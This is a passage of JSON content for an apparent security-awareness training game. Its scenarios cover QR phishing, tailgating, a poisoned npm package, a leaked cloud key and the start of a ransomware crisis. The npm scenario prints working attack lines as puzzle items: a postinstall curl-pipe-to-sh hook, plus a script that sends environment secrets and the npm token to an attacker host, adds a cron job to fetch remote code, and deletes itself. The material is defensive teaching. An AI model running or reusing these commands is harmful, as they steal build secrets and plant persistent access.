            "id": "gift",
            "html": "Festive bonus: a ₹2,000 meal voucher for every Helix employee!"
          },
          {
            "id": "creds",
            "html": "Scan the QR code and sign in with your Helix email and password to claim it.",
            "flag": true,
            "note": "A meal voucher never needs your work password."
          },
          {
            "id": "time",
            "html": "Offer ends at 5 PM today.",
            "flag": true,
            "note": "A tight deadline is there to rush you into acting without checking."
          },
          {
            "id": "url",
            "html": "<span class=\"qrmini\" aria-hidden=\"true\"></span> QR code opens: helixpay-rewards.co/sso",
            "flag": true,
            "note": "This address only looks like Helix’s, so check the link your phone shows before opening."
          },
          {
            "id": "tape",
            "html": "<i>The poster is stuck on top of the official canteen notice.</i>",
            "flag": true,
            "note": "Covering a real notice with a fake one is a common QR-code scam trick."
          },
          {
            "id": "fest",
            "html": "Happy festive season from all of us!"
          }
        ],
        "hint": "Check four things: what it asks for, where the link goes, how much time you get, and where it was stuck.",
        "debrief": "A QR code hides where it takes you, and no real voucher needs your password. Still, six people scanned it before lunch, and two typed in their Helix email and password.<br><b>Remember:</b> Never sign in with your work password from a QR code on a poster.",
        "topic": "phishing",
        "good": "You saw through the QR-code scam poster.",
        "gap": "QR codes hide where links go. A voucher never needs your work password.",
        "act": "Never type your work password after scanning a QR code on a poster."
      },
      {
        "type": "code",
        "name": "The door log",
        "mask": "##:##",
        "answer": "1441",
        "task": "Here’s Thursday’s door log. Enter the time (from the Time column) the stranger actually got into the printer room.",
        "cols": [
          "Time",
          "Door",
          "Event"
        ],
        "rows": [
          [
            "14:27",
            "Main entrance",
            "Badge 1043 (Priya): let in",
            "ok"
          ],
          [
            "14:27",
            "Main entrance",
            "Door held open 9 seconds: alert, someone may have followed her in",
            "bad"
          ],
          [
            "14:35",
            "Floor 3 lobby",
            "Visitor badge V-17: let in",
            "ok"
          ],
          [
            "14:38",
            "Printer room",
            "Visitor badge V-17: refused, no access",
            "bad"
          ],
          [
            "14:41",
            "Printer room",
            "Door opened with no badge: alarm went off, nobody checked",
            "bad"
          ],
          [
            "14:58",
            "Main entrance",
            "Visitor badge V-17: left the building",
            "ok"
          ]
        ],
        "hint": "His badge was refused. Check what happened at that same door soon after.",
        "debrief": "His badge was refused at 2:38 PM, so he walked through the propped-open door at 2:41 PM and plugged in the device. It sat on the office network overnight. And the device wasn’t the only thing he could walk away with.<br><b>Remember:</b> A propped door skips every badge reader. Close it and report it.",
        "topic": "physical",
        "good": "You read the door log and found how he really got in.",
        "gap": "A door propped open skips every badge reader.",
        "act": "Close propped doors and report them to Facilities."
      },
      {
        "type": "pick",
        "name": "The walk-through",
        "task": "He walked past these desks on floor 3 alone. Pick the 3 things he could easily photograph or take.",
        "items": [
          {
            "id": "note",
            "text": "A sticky note with the Wi-Fi password stuck on a monitor",
            "bad": true,
            "why": "Anyone walking past can read a password on a sticky note."
          },
          {
            "id": "locked",
            "text": "A laptop with its screen locked and a privacy filter (a side-view blocker) on",
            "why": "Locked and covered: nothing to see."
          },
          {
            "id": "print",
            "text": "A printout of merchant payment details left in the printer tray",
            "bad": true,
            "why": "Printouts are easy to walk off with. Collect them straight away."
          },
          {
            "id": "drawer",
            "text": "Notebooks in a locked desk drawer",
            "why": "Locked away, so out of reach."
          },
          {
            "id": "board",
            "text": "A whiteboard listing the network team’s server names and admin usernames",
            "bad": true,
            "why": "Server names and usernames tell an attacker where to aim. Wipe whiteboards after meetings."
          },
          {
            "id": "photo",
            "text": "A team photo pinned to the desk partition",
            "why": "Harmless. It gives nothing useful away."
          }
        ],
        "hint": "Look for useful information left in the open, with no lock or password on it.",
        "debrief": "Doors are only one layer of protection. Passwords, printouts and whiteboards in plain view are free for anyone passing. A clear desk and a locked screen leave a visitor nothing to collect.<br><b>Remember:</b> Clear your desk, collect printouts and wipe whiteboards.",
        "topic": "physical",
        "good": "You knew what a clear desk protects.",
        "gap": "Passwords on sticky notes, printouts and whiteboards are free for any visitor to see.",
        "act": "Clear your desk, collect printouts and wipe whiteboards."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "You spot an unknown device plugged in at work. Put the 4 steps in order, first to last.",
        "steps": [
          {
            "id": "leave",
            "text": "Leave it where it is. Don’t unplug it or plug it into anything else."
          },
          {
            "id": "call",
            "text": "Call Security right away and tell them where it is."
          },
          {
            "id": "iso",
            "text": "Security switches off that network socket and keeps the device as evidence."
          },
          {
            "id": "rules",
            "text": "Tighten the rules: stay with visitors, keep doors shut, don’t let in anyone without a badge."
          }
        ],
        "shown": [
          "iso",
          "rules",
          "call",
          "leave"
        ],
        "hint": "First, touch nothing. Then: who handles it, and what gets fixed last?",
        "debrief": "Someone who can walk in and plug in a device gets past every firewall (the network’s security gate). Politely asking a stranger who they are, and staying with visitors, is security, not rudeness.<br><b>Remember:</b> Unknown device? Don’t touch it. Call Security.",
        "topic": "physical",
        "good": "You know what to do with an unknown device.",
        "gap": "Don’t touch an unknown device. Call Security, and let them switch off the socket and keep it as evidence.",
        "act": "Leave unknown devices alone and call Security straight away."
      }
    ],
    "lessons": [
      "Holding the door is kind, but not for someone without a badge.",
      "Always stay with visitors. Keep doors shut.",
      "QR codes hide links. Never sign in from a poster.",
      "Unknown device? Don’t touch it. Call Security.",
      "Check unexpected visit requests with a person or number you already know.",
      "Clear your desk and lock your screen whenever you step away."
    ],
    "decision": {
      "type": "decision",
      "name": "The stolen passwords",
      "prompt": "Two staff typed their Helix passwords into the poster’s fake page. What should happen now?",
      "options": [
        {
          "id": "reset",
          "text": "They report it and change their passwords now. Security checks their recent sign-ins.",
          "q": "best",
          "note": "A quick reset plus a sign-in check shuts the attacker out."
        },
        {
          "id": "next",
          "text": "They change their passwords next time they log in, when it’s convenient.",
          "q": "ok",
          "note": "The stolen passwords keep working for hours. Change them right away. +60 seconds."
        },
        {
          "id": "tear",
          "text": "Someone tears the poster down, and nobody says anything about it.",
          "q": "poor",
          "note": "The stolen passwords still work, and someone is about to use one. +120 seconds, and a detour."
        }
      ],
      "topic": "identity",
      "good": "You acted fast on the stolen passwords.",
      "gap": "If someone types their password into a fake page: report it, change it now, and check recent sign-ins.",
      "act": "Report it and reset at once if you ever type your password into a fake page."
    },
    "detour": {
      "type": "pick",
      "name": "The overseas sign-in",
      "task": "Next morning, one of those accounts is signed in from another country. Pick the 2 things to do right now.",
      "items": [
        {
          "id": "out",
          "text": "Sign the account out on every device and reset the password",
          "bad": true
        },
        {
          "id": "wait",
          "text": "Wait for a second odd sign-in, just to be sure",
          "why": "One strange sign-in is enough. Act now."
        },
        {
          "id": "mfa",
          "text": "Check if the attacker added their own phone for MFA (sign-in approvals)",
          "bad": true
        },
        {
          "id": "del",
          "text": "Delete the account’s emails so the attacker can’t read them"
        }
      ],
      "hint": "Throw the attacker out, and block the way they could get back in.",
      "debrief": "The attacker is signed out, the password is new, and their extra MFA phone is removed. One poster led to a stolen account.<br><b>Remember:</b> A strange sign-in alert needs action now. Report it at once.",
      "topic": "identity",
      "good": "You knew how to lock an attacker out of an account.",
      "gap": "Sign the account out everywhere, reset the password and remove any phone the attacker added.",
      "act": "Report unexpected sign-in alerts at once."
    },
    "track": "core"
  },
  {
    "id": "pkg",
    "track": "dev",
    "title": "The Poisoned Package",
    "company": "Tessera Pay",
    "threat": "Supply-chain attack: a lookalike package steals build secrets",
    "lede": "Thursday, 9:05 AM. At 2 AM, the settlement app’s build server (the machine that builds and releases the code) sent data to an unknown website. Nobody changed the code. So what ran?",
    "locks": [
      {
        "type": "spot",
        "frame": "code",
        "name": "The package list",
        "fileName": "package.json",
        "task": "This package.json lists the packages (ready-made code from others) last night’s build installed. Tap the 4 lines that let an attacker in.",
        "items": [
          {
            "id": "name",
            "html": "\"name\": \"tessera-settlement-api\","
          },
          {
            "id": "start",
            "html": "\"start\": \"node server.js\","
          },
          {
            "id": "post",
            "html": "\"postinstall\": \"curl -s http://45.83.12.7/i.sh | sh\",",
            "flag": true,
            "note": "On every install, this downloads a script from an unknown IP address and runs it."
          },
          {
            "id": "express",
            "html": "\"express\": \"^4.19.2\","
          },
          {
            "id": "axois",
            "html": "\"axois\": \"^1.7.2\",",
            "flag": true,
            "note": "A typosquat (lookalike name): the real package is “axios”, and attackers wait for your typo."
          },
          {
            "id": "git",
            "html": "\"upi-helper\": \"github:free-dev-tools/upi-helper\",",
            "flag": true,
            "note": "This dependency (code your project relies on) comes from a stranger’s GitHub, not the approved registry."
          },
          {
            "id": "latest",
            "html": "\"date-fns\": \"latest\",",
            "flag": true,
            "note": "“latest” grabs whatever was published last, even a hijacked version, so pin an exact version."
          },
          {
            "id": "lodash",
            "html": "\"lodash\": \"4.17.21\""
          }
        ],
        "hint": "Read each name letter by letter. Then ask: where does this code come from, which version is it, and does anything run on install?",
        "debrief": "One wrong letter let attacker code into the build: the lookalike package “axois” ran its own install script. But what did it take, and when?<br><b>Remember:</b> Check every package name letter by letter, and be wary of anything that runs on install.",
        "topic": "supply",
        "good": "You spotted the install script, the lookalike name, the GitHub code and the unpinned version.",
        "gap": "Lookalike names, install scripts, code from random GitHub accounts and “latest” versions let attackers in.",
        "act": "Check each package name letter by letter before you add it."
      },
      {
        "type": "code",
        "name": "The build log",
        "mask": "##:##:##",
        "answer": "021034",
        "task": "This is the CI pipeline (automatic build-and-test system) log for build #4182. Enter the Time (HH:MM:SS) when the secrets were sent out.",
        "cols": [
          "Time",
          "Step",
          "Detail"
        ],
        "rows": [
          [
            "02:10:04",
            "Build started",
            "Main branch, build #4182",
            "ok"
          ],
          [
            "02:10:31",
            "npm install (download packages)",
            "412 packages installed",
            "ok"
          ],
          [
            "02:10:33",
            "axois@1.7.2 install script",
            "Read 14 environment variables (the build’s passwords and keys)",
            "bad"
          ],
          [
            "02:10:34",
            "Outbound web request",
            "Sent 3.1 KB of data to paste-cdn.xyz",
            "bad"
          ],
          [
            "02:11:20",
            "Tests",
            "218 tests passed",
            "ok"
          ],
          [
            "02:12:02",
            "Deploy (release)",
            "Staging (test copy of the app) updated",
            "ok"
          ]
        ],
        "hint": "Reading secrets isn’t the same as sending them. Find the row where data leaves the server for an outside website.",
        "debrief": "At 2:10:34 AM the package sent the build’s secrets, including deploy keys (keys that release code to live systems), to the attacker. Tests still passed and the deploy looked normal.<br><b>Remember:</b> A green build isn’t proof of a safe build. Check what it connected to.",
        "topic": "secrets",
        "good": "You found the exact second the secrets left.",
        "gap": "A bad package can steal any secret the build can see.",
        "act": "Give builds only the secrets they need, and make them expire quickly."
      },
      {
        "type": "spot",
        "frame": "code",
        "name": "The script",
        "fileName": "i.sh · downloaded by the postinstall line",
        "task": "This is i.sh, the script the install line (postinstall) downloaded and ran. Tap the 4 lines that cause harm.",
        "items": [
          {
            "id": "sh",
            "html": "#!/bin/sh"
          },
          {
            "id": "echo",
            "html": "echo &quot;Setting up upi-helper...&quot;"
          },
          {
            "id": "env",
            "html": "env | base64 | curl -s -X POST --data-binary @- https://upi-helper.top/c",
            "flag": true,
            "note": "Sends all the build’s settings, passwords and keys included, to the attacker."
          },
          {
            "id": "npmrc",
            "html": "cat ~/.npmrc 2&gt;/dev/null | curl -s -X POST --data-binary @- https://upi-helper.top/n",
            "flag": true,
            "note": "Steals the npm token (the login for publishing packages), so the attacker can publish as your company."
          },
          {
            "id": "mk",
            "html": "mkdir -p ~/.cache/upi"
          },
          {
            "id": "cron",
            "html": "(crontab -l 2&gt;/dev/null; echo &quot;*/30 * * * * curl -s https://upi-helper.top/b | sh&quot;) | crontab -",
            "flag": true,
            "note": "Sets up a scheduled job that runs the attacker’s code again every 30 minutes."
          },
          {
            "id": "rm",
            "html": "rm -f &quot;$0&quot;",
            "flag": true,
            "note": "The script deletes itself to hide the evidence."
          }
        ],
        "hint": "Look for lines that send data to an outside website, set something to run again later, or delete evidence.",
        "debrief": "The script stole the build’s secrets and the npm token, set a job to come back every 30 minutes, then deleted itself. Removing the package isn’t enough: rebuild the server from a clean image (a fresh, trusted copy).<br><b>Remember:</b> Once a server has run attacker code, rebuild it from clean. Don’t just delete the package.",
        "topic": "supply",
        "good": "You read the script and found the theft, the way back in and the cover-up.",
        "gap": "Bad install scripts steal secrets, set up a way back in and hide. Rebuild from clean.",
        "act": "Rebuild hacked servers from clean images; don’t just remove the package."
      },
      {
        "type": "pick",
        "name": "The keys",
        "task": "The build could read all of these. Pick the 3 you must rotate (replace with new ones) now.",
        "items": [
          {
            "id": "aws",
            "text": "The cloud deploy key used to release code to production",
            "bad": true
          },
          {
            "id": "cdn",
            "text": "The public address of your website",
            "why": "Anyone can already see it. There’s nothing secret to replace."
          },
          {
            "id": "npm",
            "text": "The token that publishes your company’s own packages",
            "bad": true,
            "why": "With it, attackers can push poisoned versions of your packages to everyone who uses them."
          },
          {
            "id": "lic",
            "text": "The project’s open-source licence file"
          },
          {
            "id": "db",
            "text": "The password for the staging (test) database",
            "bad": true
          },
          {
            "id": "chan",
            "text": "The name of the team’s chat channel"
          }
        ],
        "hint": "Ask of each one: is it a secret? Any secret the build could read counts as stolen.",
        "debrief": "If the build could read a secret, assume the attacker has it. Rotate first, and investigate at the same time.<br><b>Remember:</b> A leaked secret stays dangerous until you replace it.",
        "topic": "secrets",
        "good": "You knew which secrets to rotate first.",
        "gap": "Deploy keys, publishing tokens and database passwords the build could read must all be rotated.",
        "act": "Rotate every secret a hacked build could read."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "The attack is confirmed. Put the 4 response steps in the right order.",
        "steps": [
          {
            "id": "stop",
            "text": "Stop the build pipeline and block traffic to the attacker’s website."
          },
          {
            "id": "rot",
            "text": "Rotate (replace) every secret the build could read."
          },
          {
            "id": "clean",
            "text": "Remove the bad package and rebuild from a clean lockfile (the list of exact versions)."
          },
          {
            "id": "prev",
            "text": "Prevent a repeat: use an approved package registry, scan dependencies, and turn off install scripts in CI."
          }
        ],
        "shown": [
          "clean",
          "prev",
          "stop",
          "rot"
        ],
        "hint": "Stop the attack first. Then make the stolen secrets useless. Then clean up. Last, prevent a repeat.",
        "debrief": "A supply-chain attack (poisoning code that others reuse) hits everyone who trusts the package. Approved registries and pinned versions are your guard rails.<br><b>Remember:</b> Stop it, rotate secrets, rebuild clean, then prevent a repeat.",
        "topic": "response",
        "good": "You put the supply-chain response in order.",
        "gap": "Stop and block, rotate secrets, rebuild clean, then prevent a repeat.",
        "act": "Know your pipeline’s stop button and who can press it."
      },
      {
        "type": "choice",
        "name": "The safe install",
        "task": "You’re rebuilding the pipeline. How should CI install packages from now on?",
        "options": [
          {
            "id": "latest",
            "text": "<code>npm install</code> on every build, so you always get the newest versions and fixes.",
            "why": "Always taking the newest version is exactly how a poisoned release slips in unnoticed."
          },
          {
            "id": "ci",
            "text": "<code>npm ci --ignore-scripts</code> with the saved lockfile, from the approved registry only.",
            "right": true,
            "why": "You get the exact versions you reviewed, no install scripts, and only packages the company has scanned."
          },
          {
            "id": "force",
            "text": "<code>npm install --force</code> to get past errors, then run <code>npm audit</code> after deploying.",
            "why": "Forcing hides warnings, and a security check after deploying is too late."
          },
          {
            "id": "top",
            "text": "Pin only the main packages in package.json and skip the lockfile to keep it simple.",
            "why": "Without a lockfile, the packages your packages depend on can still change without warning."
          }
        ],
        "hint": "You want the exact versions you reviewed, no surprise scripts, and a trusted source.",
        "debrief": "With a lockfile, install scripts off and an approved registry, this attack becomes a failed build instead of a breach.<br><b>Remember:</b> In CI, install exact versions from a trusted source, with install scripts switched off.",
        "topic": "supply",
        "good": "You chose the install setup that blocks this attack.",
        "gap": "In CI, use npm ci with the saved lockfile, no install scripts and an approved registry.",
        "act": "Use npm ci --ignore-scripts and an approved registry in CI."
      }
    ],
    "lessons": [
      "Check package names letter by letter. Lookalike packages are one typo away.",
      "Pin exact versions, save the lockfile with your code, and switch off install scripts in CI.",
      "Treat every secret the build could see as stolen. Rotate it first.",
      "Install from the company’s approved, scanned registry, not from anywhere on the internet.",
      "A bad install script steals secrets, sets up a way back in and hides. Rebuild from clean; don’t just delete the package."
    ],
    "decision": {
      "type": "decision",
      "name": "The release",
      "prompt": "It’s 9:30 AM. You’ve found the bad package, and the release to production (the live app) is due at 11. What do you do?",
      "options": [
        {
          "id": "stop",
          "text": "Stop the release, tell Security, and treat every secret in the build as stolen.",
          "q": "best",
          "note": "Right call. The secrets are stolen whether or not the release goes out."
        },
        {
          "id": "ship",
          "text": "Remove the bad package, release at 11, and rotate the secrets next sprint.",
          "q": "ok",
          "note": "Stolen secrets keep working until you rotate them. That’s days of open access for the attacker. +60 seconds."
        },
        {
          "id": "ignore",
          "text": "It only ran in staging (the test setup), so release at 11 as planned.",
          "q": "poor",
          "note": "The same pipeline holds the key that releases to production. Now check what the attacker did with it. +120 seconds, and a detour."
        }
      ],
      "topic": "response",
      "good": "You stopped the release and treated every secret as stolen.",
      "gap": "Never release from a hacked pipeline. Stop, tell Security, rotate every secret.",
      "act": "Stop the pipeline when you suspect an attack, even on deadline day."
    },
    "detour": {
      "type": "pick",
      "name": "Production check",
      "task": "The key that releases to production was in that build. Pick the 2 signs that the attacker has used it.",
      "items": [
        {
          "id": "iam",
          "text": "A new cloud admin user created at 3:12 AM",
          "bad": true,
          "why": "Attackers create their own accounts so they can come back."
        },
        {
          "id": "bak",
          "text": "The regular scheduled database backup at 1:00 AM"
        },
        {
          "id": "ip",
          "text": "API calls (requests to your systems) from a country you don’t operate in",
          "bad": true
        },
        {
          "id": "dev",
          "text": "A developer signing in from the Pune office at 9 AM"
        }
      ],
      "hint": "Look for activity that wasn’t scheduled and that nobody on the team did.",
      "debrief": "You removed the backdoor account (the attacker’s hidden way back in) and rotated the key. Shipping on time nearly cost you production.<br><b>Remember:</b> A new admin account nobody asked for is a red flag. Check it right away.",
      "topic": "cloud",
      "good": "You spotted the signs of the key being used.",
      "gap": "New admin users and calls from unexpected countries mean the attacker is in production.",
      "act": "Set alerts for new admin users and API calls from unusual places."
    }
  },
  {
    "id": "repo",
    "track": "dev",
    "title": "The Leaky Repo",
    "company": "Arcadia Pay",
    "threat": "Keys left in code, public forks, stolen cloud keys",
    "lede": "Saturday, 11:40 AM. A billing alert goes off: ₹3.8 lakh spent overnight on cloud servers that nobody here started.",
    "locks": [
      {
        "type": "spot",
        "frame": "code",
        "name": "The commit",
        "fileName": "Commit 9f3c2a · “quick fix for demo”",
        "task": "This commit (a saved change to the code) went out on Friday evening. Tap the 4 risky lines.",
        "items": [
          {
            "id": "imp",
            "html": "  import express from \"express\";"
          },
          {
            "id": "env",
            "html": "- const CLOUD_KEY = process.env.CLOUD_KEY;"
          },
          {
            "id": "key",
            "html": "+ const CLOUD_KEY = \"AKIA6X••••••••W2PL\"; // TODO move to env",
            "flag": true,
            "note": "A live cloud key (like a password for our cloud account) is in the code, so anyone who sees it can use it."
          },
          {
            "id": "json",
            "html": "  app.use(express.json());"
          },
          {
            "id": "dbg",
            "html": "+ app.get(\"/debug\", (req, res) => res.json(process.env));",
            "flag": true,
            "note": "A debug page (meant for testing) that shows every server secret to anyone who opens it."
          },
          {
            "id": "cors",
            "html": "+ app.use(cors({ origin: \"*\" }));",
            "flag": true,
            "note": "CORS (which sites may call our API) is “*”, so any website can call it from a user’s browser."
          },
          {
            "id": "fork",
            "html": "+ # pushed to personal fork github.com/rohan-dev/arcadia-payouts (public)",
            "flag": true,
            "note": "Company code went to a public fork (Rohan’s own copy of the repository), and bots scan public code for keys all day."
          },
          {
            "id": "lst",
            "html": "  app.listen(8080);"
          }
        ],
        "hint": "Look for a password typed into code, a page that leaks secrets, a setting that trusts every website, and where the code was sent.",
        "debrief": "The key went public on Friday at 6:02 PM, when the code reached the public fork. Next, find out how fast someone used it.<br><b>Remember:</b> Keys and passwords never go in code, not even for a quick demo.",
        "topic": "secrets",
        "good": "You found the key in the code, the debug page, the open CORS rule and the public fork.",
        "gap": "Keys in code, debug pages, open CORS and public forks each put the company at risk.",
        "act": "Run a secret scan before every push."
      },
      {
        "type": "code",
        "name": "The cloud trail",
        "mask": "##:##",
        "answer": "1816",
        "task": "Below is Friday’s timeline. Enter the time the attacker first used the leaked key.",
        "cols": [
          "When",
          "Source",
          "Event"
        ],
        "rows": [
          [
            "Fri 18:02",
            "GitHub",
            "Commit 9f3c2a (with the key) pushed to the public fork",
            "bad"
          ],
          [
            "Fri 18:09",
            "GitHub",
            "An unknown account copied (cloned) the code",
            "bad"
          ],
          [
            "Fri 18:16",
            "Cloud audit log",
            "Key used to list our servers (ListInstances) from 185.220.x.x",
            "bad"
          ],
          [
            "Fri 18:21",
            "Cloud audit log",
            "32 costly GPU servers switched on in 4 regions",
            "bad"
          ],
          [
            "Sat 11:40",
            "Billing",
            "Spending alert: ₹3.8 lakh",
            "ok"
          ]
        ],
        "hint": "Copying the code isn’t the same as using the key. Find the first row where the key itself was used.",
        "debrief": "Only 14 minutes passed between the push and the first misuse. Bots hunt for leaked keys all day and find them faster than any person notices the mistake.<br><b>Remember:</b> A leaked key is used within minutes. Revoke it (switch it off) straight away.",
        "topic": "cloud",
        "good": "You saw how fast bots find and use a leaked key.",
        "gap": "Bots use leaked keys within minutes. Revoke (switch off) the key at once.",
        "act": "Revoke a leaked key at once, before you investigate."
      },
      {
        "type": "spot",
        "frame": "code",
        "name": "The debug page",
        "fileName": "GET /debug · public response",
        "task": "The new /debug page showed the server’s hidden settings to anyone. Tap the 4 secrets that must now be rotated (swapped for new ones).",
        "items": [
          {
            "id": "env",
            "html": "&quot;NODE_ENV&quot;: &quot;production&quot;,"
          },
          {
            "id": "port",
            "html": "&quot;PORT&quot;: &quot;8080&quot;,"
          },
          {
            "id": "db",
            "html": "&quot;DATABASE_URL&quot;: &quot;postgres://payouts:Arc•••••25@db.internal:5432/payouts&quot;,",
            "flag": true,
            "note": "It holds the password to the payouts database."
          },
          {
            "id": "sign",
            "html": "&quot;PAYOUT_SIGNING_KEY&quot;: &quot;psk_live_9f2c••••••••a71e&quot;,",
            "flag": true,
            "note": "It signs payout requests, so an attacker could use it to send money."
          },
          {
            "id": "lvl",
            "html": "&quot;LOG_LEVEL&quot;: &quot;info&quot;,"
          },
          {
            "id": "jwt",
            "html": "&quot;JWT_SECRET&quot;: &quot;c8d1••••••••••7b30&quot;,",
            "flag": true,
            "note": "With it, anyone can fake a login and act as any user."
          },
          {
            "id": "smtp",
            "html": "&quot;SMTP_PASSWORD&quot;: &quot;Mail••••2025&quot;,",
            "flag": true,
            "note": "It lets attackers send real-looking email as Arcadia Pay."
          },
          {
            "id": "app",
            "html": "&quot;APP_NAME&quot;: &quot;arcadia-payouts&quot;"
          }
        ],
        "hint": "Plain settings like the port are harmless. Pick the values that work like a password or a key.",
        "debrief": "Every value on that page is now public, so all four secrets must be replaced today. Debug pages should never reach live code.<br><b>Remember:</b> If a secret was exposed, rotate it. Hiding it again is not enough.",
        "topic": "secrets",
        "good": "You knew which exposed secrets had to be rotated.",
        "gap": "Rotate any secret a debug page exposed, and never ship debug pages.",
        "act": "Remove debug pages before code goes live."
      },
      {
        "type": "pick",
        "name": "The guard rails",
        "task": "Pick the 3 safety controls that would have stopped this leak.",
        "items": [
          {
            "id": "push",
            "text": "Push protection: blocks any push that contains a key",
            "bad": true,
            "why": "It stops the commit before the key ever leaves the laptop."
          },
          {
            "id": "pw",
            "text": "Longer, stronger passwords on all GitHub accounts",
            "why": "A good habit, but it doesn’t stop a key going into the code."
          },
          {
            "id": "vault",
            "text": "Secrets kept in a vault (a locked store), never in code",
            "bad": true
          },
          {
            "id": "ren",
            "text": "Renaming the repository so it is harder to find"
          },
          {
            "id": "fork",
            "text": "Blocking forks of company code to personal accounts",
            "bad": true
          },
          {
            "id": "care",
            "text": "Reminding developers by email to be more careful"
          }
        ],
        "hint": "Pick controls that work automatically, even when someone is rushing on a Friday evening.",
        "debrief": "Good controls make the safe way the easy way. Push protection and a vault would have stopped this commit, and blocked forks would have kept the code inside the company.<br><b>Remember:</b> Don’t rely on people being careful. Use tools that block the mistake.",
        "topic": "secrets",
        "good": "You picked controls that make the safe way the easy way.",
        "gap": "Push protection, a secrets vault and blocking personal forks stop this kind of leak.",
        "act": "Turn on push protection for every repository."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "Put these response steps in order, from first to last.",
        "steps": [
          {
            "id": "rev",
            "text": "Revoke (switch off) the key and shut down the attacker’s servers."
          },
          {
            "id": "logs",
            "text": "Read the cloud audit log (record of every action) to see what the key did."
          },
          {
            "id": "purge",
            "text": "Delete the key from Git history and the fork, and rotate the other secrets."
          },
          {
            "id": "ctrl",
            "text": "Turn on push protection and a secrets vault for every repository."
          }
        ],
        "shown": [
          "purge",
          "ctrl",
          "rev",
          "logs"
        ],
        "hint": "Stop the damage first. Then find out what the key touched.",
        "debrief": "Revoking the key stops the bill growing. The audit log then shows if the attacker did more than run crypto-mining servers.<br><b>Remember:</b> Switch off a leaked key first, then check everything it did.",
        "topic": "response",
        "good": "You put the leaked-key response in the right order.",
        "gap": "Revoke the key, check the audit logs, clean up and rotate, then add guard rails.",
        "act": "Check what a leaked key did, not only that it is revoked."
      },
      {
        "type": "choice",
        "name": "The personal fork",
        "task": "Rohan says: “I pushed the code to my own GitHub so I could work over the weekend.” What should he have done instead?",
        "options": [
          {
            "id": "priv",
            "text": "Put it in a private repository on his own GitHub.",
            "why": "Private or not, his own account is outside company control and goes with him if he leaves."
          },
          {
            "id": "co",
            "text": "Worked in the company repository on his work laptop, over the VPN.",
            "right": true,
            "why": "Company code stays on company accounts and devices, where the company controls access."
          },
          {
            "id": "zip",
            "text": "Zipped the code and emailed it to his personal address.",
            "why": "Now the code, and any secrets in it, sit in a personal mailbox."
          },
          {
            "id": "usb",
            "text": "Copied the code to a pen drive to work on at home.",
            "why": "Pen drives get lost, and nothing on them is logged or protected."
          }
        ],
        "hint": "Which choice keeps the code on company accounts and company devices?",
        "debrief": "Company code belongs in company repositories, on company accounts and devices. That way the company can check, protect and remove access, even after someone leaves.<br><b>Remember:</b> Never put company code on personal accounts, public or private.",
        "topic": "data",
        "good": "You kept company code under company control.",
        "gap": "Company code stays in company repositories on company devices. Personal copies are outside our control.",
        "act": "Never push company code to personal accounts, public or private."
      }
    ],
    "lessons": [
      "Never put keys in code, not even “just for the demo”.",
      "Company code stays in company repositories, never in personal forks.",
      "A leaked key is used within minutes. Revoke it at once; deleting the commit isn’t enough.",
      "Push protection and a secrets vault make the safe way the easy way.",
      "Debug pages that show server secrets never ship. Rotate anything they exposed."
    ],
    "decision": {
      "type": "decision",
      "name": "The quick fix",
      "prompt": "The developer says: “I’ll just delete the key in a new commit. Problem solved.” What do you do?",
      "options": [
        {
          "id": "rev",
          "text": "Revoke the key now, then clean the Git history and tell Security.",
          "q": "best",
          "note": "Once revoked, every leaked copy of the key is useless, wherever it went."
        },
        {
          "id": "priv",
          "text": "Make the repo private now and revoke the key on Monday.",
          "q": "ok",
          "note": "Bots have already copied it, and every hour the key still works, the bill grows. +60 seconds."
        },
        {
          "id": "del",
          "text": "Agree: delete the key in a new commit and move on.",
          "q": "poor",
          "note": "The key is still in the Git history and in every copy bots made, and it still works. +120 seconds, and a detour."
        }
      ],
      "topic": "secrets",
      "good": "You revoked the key first, then cleaned up.",
      "gap": "Deleting a key in a new commit doesn’t switch it off. Git history and copies keep it working.",
      "act": "Revoke first, clean history second."
    },
    "detour": {
      "type": "pick",
      "name": "Still out there",
      "task": "The new commit removed the key from the latest code, but the key still works. Pick the 2 places where it can still be found.",
      "items": [
        {
          "id": "hist",
          "text": "Old versions in the fork’s Git history",
          "bad": true
        },
        {
          "id": "bin",
          "text": "The recycle bin on the developer’s laptop"
        },
        {
          "id": "clones",
          "text": "Copies bots and mirror sites already made",
          "bad": true
        },
        {
          "id": "jira",
          "text": "The ticket on the team’s task board"
        }
      ],
      "hint": "Git keeps every old version, and anything public gets copied.",
      "debrief": "A new commit hides the key from today’s code, but old versions and copies still have it. Once a secret is public, the only fix is to make it useless by revoking it.<br><b>Remember:</b> Treat any pushed secret as public forever. Revoke it.",
      "topic": "secrets",
      "good": "You knew where a leaked key still lives.",
      "gap": "Git history and bot copies keep a key alive after a new commit.",
      "act": "Assume any secret that was pushed is public forever."
    }
  },
  {
    "id": "lead-ransom",
    "track": "lead",
    "title": "The Weekend Crisis",
    "company": "Vertex Pay",
    "threat": "Leadership: a ransomware attack, the regulators and the ransom decision",
    "lede": "Saturday, 2:40 AM. Your CISO (head of information security) calls: ransomware (software that locks files until a ransom is paid) is spreading through the settlement platform. Monday’s settlement for 14 bank clients is at risk, and the attackers say they have customer data.",
    "locks": [
      {
        "type": "choice",
        "name": "The 2 AM call",
        "task": "You’re the CEO, and the CISO has just briefed you. What do you do first?",
        "options": [
          {
            "id": "quiet",
            "text": "Let the CISO handle it quietly and give you an update on Monday.",
            "why": "Decisions about money, regulators and clients need leadership involved from the first hour."
          },
          {
            "id": "plan",
            "text": "Activate the incident plan, gather the crisis team now, and put the CISO in charge.",
            "right": true,
            "why": "One plan, one person in charge (the incident commander), and your backing from the first hour."
          },
          {
            "id": "clients",
            "text": "Call your biggest bank clients right away to reassure them it’s under control.",
            "why": "Calling before you have the facts risks saying something wrong. Update clients through the plan, soon, with facts."
          },
          {
            "id": "hands",
            "text": "Take charge of the technical fix yourself and direct the IT team.",
            "why": "Your job is to decide and support. Let the CISO, as incident commander, run the response."
          }
        ],
        "hint": "Set up the structure before any action: which plan, who leads, and who joins.",
        "debrief": "By 3:05 AM the crisis team is on a call, with the CISO leading. Legal’s first question: when does the regulator’s reporting deadline run out?<br><b>Remember:</b> In a crisis, start the plan and name one person in charge before anything else.",
        "topic": "leadership",
        "good": "You put a plan and one leader in charge from the first hour.",
        "gap": "In a crisis, leaders set structure first: start the plan, name one person in charge, and gather the crisis team.",
        "act": "Check that your incident plan names who leads in a crisis and has a 24×7 crisis call list."
      },
      {
        "type": "code",
        "name": "The reporting clock",
        "mask": "##:##",
